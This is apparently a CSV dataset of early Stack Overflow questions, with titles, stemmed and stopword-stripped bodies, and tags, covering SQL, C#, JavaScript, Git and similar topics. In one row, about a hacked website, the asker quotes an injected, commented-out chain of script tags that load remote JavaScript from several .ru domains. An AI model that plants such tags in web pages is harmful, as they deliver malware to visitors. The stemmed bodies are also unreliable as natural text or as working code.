,DId,DTitle,DBody,DTags
53,2840,Paging SQL Server 2005 Results,"page result sql server 2005? tri sql server 2000, reliabl way this. i'm wonder sql server 2005 built method? mean page is, example, list user username, want abl return first 10 records, next 10 record on. help would much appreciated.",<sql><sql-server-2005><paging>
54,4418,How do I update Ruby Gems from behind a Proxy (ISA-NTLM),"firewal i'm behind run microsoft isa server ntlm-onli mode. hash anyon success get rubi gem install/upd via rubi sspi gem method? ... lazy? note: rubysspi-1.2.4 work. also work ""igem"", part ironrubi project",<ruby><proxy><rubygems><ironruby>
55,5913,Getting the text from a drop-down box,"get valu whatev select dropdown menu. document.getelementbyid('newskill').valu cannot howev find properti go text that' current display drop menu. tri ""text"" look w3school answer, anybodi know? sure, here' html drop box. <select name=""newskill"" id=""newskill""> <option value=""1"">a skill</option> <option value=""2"">anoth skill</option> <option value=""3"">yet anoth skill</option> </select>",<javascript><dom><browser><client-side>
56,3859,What is the difference between all the different types of version control?,told least 10 peopl version control good thing even followup question. differ differ type version control guid anybodi know version control that' simpl easi understand?,<version-control>
57,3319,How to set background color of HTML element using css properties in JavaScript,set background color html element use css javascript?,<javascript><css><background-color>
58,3213,Convert integers to written numbers,"effici method convert integ written numbers, example: string written = integertowritten(21); would return ""twenti one"". way involv massiv look-up table?",<c#><integer>
59,2844,How do you format an unsigned long long int using printf?,"#includ <stdio.h> int main() { unsign long long int num = 285212672; //fyi: fit 29 bit int normalint = 5; printf(""mi number %d byte wide valu %ul. normal number %d.\n"", sizeof(num), num, normalint); return 0; } output: number 8 byte wide valu 285212672l. normal number 0. assum unexpect result print unsign long long int. printf() unsign long long int?",<c><syntax><printf><format-specifiers><long-long>
60,6009,How do you deal with configuration files in source control?,"let' say typic web app file configuration.whatever. everi develop work project one version dev boxes, dev, prod stage versions. deal sourc control? check file all, check differ name someth fanci altogether?",<svn><git><version-control><cvs>
61,7089,Creating rounded corners using CSS,creat round corner use css?,<cross-browser><rounded-corners><css>
62,3021,What is recursion and when should I use it?,one topic seem come regularli mail list onlin discuss merit (or lack thereof) comput scienc degree. argument seem come time neg parti code number year never use recursion. question is: recursion? would use recursion? peopl use recursion?,<recursion><computer-science>
63,4629,How can I evaluate C# code dynamically?,"eval(""something()""); execut code dynam javascript. way thing c#? exampl tri is: integ variabl (say i) multipl properti names: ""property1"", ""property2"", ""property3"", etc. now, want perform oper "" propertyi "" properti depend valu i. realli simpl javascript. way c#?",<c#><reflection><properties><c#-2.0>
64,3839,How do I Concatenate entire result sets in MySQL?,"i'm tri follow query: select a,b,c tabl field like 'query%' union select a,b,c tabl field like '%query' union select a,b,c tabl field like '%query%' group b order b asc limit 5 that' three queri stuck together, kinda sorta. however, result set come back reflect result queri #3 result queri #1 undesired. way priorit result come queri #1, queri #2 queri #3? want php yet (not mention control result show first queri show second forth).",<mysql><sql><union>
65,2785,Setting Objects to Null/Nothing after use in .NET,"set object null (noth vb.net) finish them? understand .net essenti dispos instanc object implement idispos interfac releas resourc although object still someth dispos (henc isdispos properti forms), assum still resid memori least part? also know object goe scope mark collect readi next pass garbag collector (although may take time). mind set null speed system releas memori work longer scope bad side effects? msdn articl never exampl current cannot see harm. howev come across mixtur opinion comment useful.",<c#><.net><vb.net><memory-management><null>
66,2702,How do I use T-SQL Group By,"know need (although know why) group claus end sql queri use aggreg function like count, sum, avg, etc: select count(userid), usernam user group usernam els would group useful, perform ramifications?",<sql><sql-server><group-by>
67,2933,Create a directly-executable cross-platform GUI app using Python,"python work multipl platform use desktop web applications, thu conclud way compil execut mac, window linux. problem idea start write gui it, anybodi shed light point right direct please?",<python><user-interface><deployment><tkinter><release-management>
68,7074,What is the difference between String and string in C#?,"exampl (note case): string = ""hello world!""; string = ""hello world!""; guidelin use each? differences?",<c#><.net><string><types><alias>
69,6467,Date arithmetic in Unix shell scripts,"need date arithmet unix shell script use control execut third parti programs. i'm use function increment day anoth decrement: incrementadia(){ echo $1 | awk ' begin { diasdelmes[1] = 31 diasdelmes[2] = 28 diasdelmes[3] = 31 diasdelmes[4] = 30 diasdelmes[5] = 31 diasdelmes[6] = 30 diasdelmes[7] = 31 diasdelmes[8] = 31 diasdelmes[9] = 30 diasdelmes[10] = 31 diasdelmes[11] = 30 diasdelmes[12] = 31 } { anio=substr($1,1,4) mes=substr($1,5,2) dia=substr($1,7,2) if((anio % 4 == 0 && anio % 100 != 0) || anio % 400 == 0) { diasdelmes[2] = 29; } if( dia == diasdelmes[int(mes)] ) { if( int(mes) == 12 ) { anio = anio + 1 me = 1 dia = 1 } els { me = me + 1 dia = 1 } } els { dia = dia + 1 } } end { printf(""%04d%02d%02d"", anio, mes, dia) } ' } [ $# -eq 1 ]; tomorrow=$1 els today=$(d +""%y%m%d"") tomorrow=$(incrementadia $hoy) fi need complex arithmetic. best compat way this?",<unix><shell><date><math><scripting>
70,2034,What do the result codes in SVN mean?,result code svn mean? need quick reference.,<svn>
71,3058,What is Inversion of Control?,invers control (ioc) quit confus first encountered. it? problem solve? appropri use not?,<oop><design-patterns><inversion-of-control>
72,2056,What are MVP and MVC and what is the difference?,"look beyond rad (drag-drop configure) way build user interfac mani tool encourag like come across three design pattern call model-view-controller, model-view-present model-view-viewmodel. question three part it: issu pattern address? similar? different?",<user-interface><model-view-controller><design-patterns><terminology><mvp>
73,1292,Limit size of Queue<T> in .NET?,"queue<t> object initialis capac 2, obvious capac keep expand add items. alreadi object automat dequeu item limit reached, best solut creat inherit class?",<.net><collections><queue>
74,5821,SQL Server Escape an Underscore,escap underscor character? write someth like follow claus want abl find actual entri _d end. usernam like '%_d',<sql-server>
75,6899,"How to create a SQL Server function to ""join"" multiple rows from a subquery into a single delimited field?","illustrate, assum two tabl follows: vehicleid name 1 chuck 2 larri locationid vehicleid citi 1 1 new york 2 1 seattl 3 1 vancouv 4 2 lo angel 5 2 houston want write queri return follow results: vehicleid name locat 1 chuck new york, seattle, vancouv 2 larri lo angeles, houston know done use server side cursors, ie: declar @vehicleid int declar @vehiclenam varchar(100) declar @locationc varchar(100) declar @locat varchar(4000) declar @result tabl ( vehicleid int name varchar(100) locat varchar(4000) ) declar vehiclescursor cursor select [vehicleid] , [name] [vehicles] open vehiclescursor fetch next vehiclescursor @vehicleid , @vehiclenam @@fetch_statu = 0 begin set @locat = '' declar locationscursor cursor select [city] [locations] [vehicleid] = @vehicleid open locationscursor fetch next locationscursor @locationc @@fetch_statu = 0 begin set @locat = @locat + @locationc fetch next locationscursor @locationc end close locationscursor dealloc locationscursor insert @result (vehicleid, name, locations) select @vehicleid, @name, @locat end close vehiclescursor dealloc vehiclescursor select * @result however, see, requir great deal code. would like gener function would allow someth like this: select vehicleid , name , join(select citi locat vehicleid = vehicles.vehicleid, ', ') locat vehicl possible? someth similar?",<sql><sql-server><string-concatenation>
76,5649,x86 Assembly on a Mac,"anyon know good tool (i'm look ides) write assembl mac. xcode littl cumbersom me. also, intel macs, use gener x86 asm? modifi instruct set? inform post intel. also: know windows, asm run emul environ creat os let code think run dedic machine. os x provid thing?",<xcode><macos><x86><assembly>
77,3224,How can I make the browser see CSS and Javascript changes?,"css javascript file chang often, want cach web browser. also want web browser see chang made file without requir user clear browser cache. also want solut work well version control system subversion. solut seen involv ad version number end file form queri string. could use svn revis number autom you: asp.net display svn revis number specifi includ revis variabl anoth file? html file includ revis number url css javascript file. subvers book say revision: ""thi keyword describ last known revis file chang repository"". firefox also allow press ctrl+r reload everyth particular page. clarifi look solut requir user anyth part.",<javascript><css><http><caching>
78,4622,SQL Case Expression Syntax?,complet correct syntax sql case expression?,<sql>
79,1276,How big can a MySQL database get before performance starts to degrade,"point mysql databas start lose performance? physic databas size matter? number record matter? perform degrad linear exponential? believ larg database, roughli 15m record take almost 2gb. base numbers, incent clean data out, safe allow continu scale years?",<mysql><database><database-performance>
80,4051,Passing multidimensional arrays as function arguments in C,"c pass multidimension array function singl argument know dimens array go be? besides, multidimension array may contain type strings.",<c><function><multidimensional-array>
81,3385,MAC addresses in JavaScript,know get mac address user via ie (activex objects). way obtain user' mac address use javascript?,<javascript><mac-address>
82,4369,How to include PHP files that require an absolute path?,"directori structur like following; script.php inc/include1.php inc/include2.php objects/object1.php objects/object2.php soap/soap.php now, use object script.php /soap/soap.php, could move them, want directori structur like specif reason. execut script.php includ path inc/include.php execut /soap/soap.php ../inc, absolut path work, /mnt/webdev/[project name]/inc/include1.php... ugli solut ever want move directori differ location. way use rel paths, way programmat gener ""/mnt/webdev/[project name]/""?",<php>
83,6557,"In C#, why can't a List<string> object be stored in a List<object> variable","seem list object cannot store list variabl c#, can't even explicitli cast way. list<string> sl = new list<string>(); list<object> ol; ol = sl; result cannot implicitli convert type system.collections.generic.list<string> system.collections.generic.list<object> then... list<string> sl = new list<string>(); list<object> ol; ol = (list<object>)sl; result cannot convert type system.collections.generic.list<string> system.collections.generic.list<object> course, pull everyth string list put back one time, rather convolut solution.",<c#><.net><generics><covariance><type-safety>
84,5473,How can I undo git reset --hard HEAD~1?,"possibl undo chang caus follow command? so, how? git reset --hard head~1",<git><version-control><git-reset>
85,1746,How can I get at the matches when using preg_replace in PHP?,"tri grab capit letter coupl word wrap span tags. use preg_replac extract wrap purposes, output anything. preg_replace(""/[a-z]/"", ""<span class=\""initial\"">$1</span>"", $str)",<php><regex><html-parsing><preg-replace>
86,3432,Multiple Updates in MySQL,"know insert multipl row once, way updat multipl row (a in, one query) mysql? edit: exampl follow name id col1 col2 row1 1 6 1 row2 2 2 3 row3 3 9 5 row4 4 16 8 want combin follow updat one queri updat tabl set col1 = 1 id = 1; updat tabl set col1 = 2 id = 2; updat tabl set col2 = 3 id = 3; updat tabl set col1 = 10 id = 4; updat tabl set col2 = 12 id = 4;",<mysql><sql><sql-update>
87,4314,What is Object Mocking and when do I need it?,mani peopl use mock object write unit tests. mock object? would ever need one? need mock object framework?,<testing><mocking>
88,3881,IllegalArgumentException or NullPointerException for a null parameter?,"simpl setter method properti null appropri particular property. alway torn situation: throw illegalargumentexception, nullpointerexception? javadocs, seem appropriate. kind understood standard? one thing whatev prefer realli correct?",<java><exception><null><nullpointerexception><illegalargumentexception>
89,2970,My website got hacked.. What should I do?,"dad call today said peopl go websit get 168 virus tri download computers. technic all, built whole thing wysiwyg editor. pop site open view source, line javascript includ bottom sourc right close html tag. includ file (among mani others): http://www.98hs.ru/js.j <-- turn javascript go url. comment now. turn ftp password plain dictionari word six letter long, think that' got hacked. we'v chang password 8+ digit non-word string (he go passphras sinc hunt-n-peck typer). whoi 98hs.ru found host server chile. actual e-mail address associ too, serious doubt person culprit. probabl site got hacked... idea point though i'v never dealt sort thing before. anyon suggestions? use plain jane un-secur ftp webhost4life.com. even see way sftp site. i'm think usernam password got intercepted? so, make relev community, step take/best practic follow protect websit get hacked? record, line code ""magically"" got ad file (and file comput -- i'v left comment make absolut sure anyth page, although i'm sure jeff would guard this): <!--script src=http://www.98hs.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script-->",<security><cracking>
90,2914,How can I detect if a browser is blocking a popup?,"occasionally, i'v come across webpag tri pop open new window (for user input, someth important), popup blocker prevent happening. method call window use make sure new window launch properly?",<popup>
91,20156,Is there an easy way to create ordinals in C#?,easi way c# creat ordin number? example: 1 return 1st 2 return 2nd 3 return 3rd ...etc done string.format() function avail this?,<c#><.net><ordinals>
92,9938,Generic iterator,"tri find gener way access set containers. standard vector list addit anoth custom list. custom list defin iterator; class iterator: public std::iterator<std::forward_iterator_tag, t> { // ... } iter begin() { return (iterator(root)); } iter end() { return (iterator(null)); } appropri oper overloaded. ideally, would like this; class foo { public: foo() { std::list<int> x; std::vector<int> y; custom_list<int> z; iter = x.begin(); // iter = y.begin(); // iter = z.begin(); // ... }; private: std::iterator<int> iter; }; obvious iter differ types. assum contain type however. eleg way solv problem?",<c++><generics><iteration><containers>
93,15142,What are the pros and cons to keeping SQL in Stored Procs versus Code,"advantages/disadvantag keep sql c# sourc code store procs? i'v discuss friend open sourc project we'r work (c# asp.net forum). moment, databas access done build sql inlin c# call sql server db. i'm tri establish which, particular project, would best. far have: advantag code: easier maintain - need run sql script updat queri easier port anoth db - proc port advantag store procs: perform secur",<c#><sql><sql-server><stored-procedures>
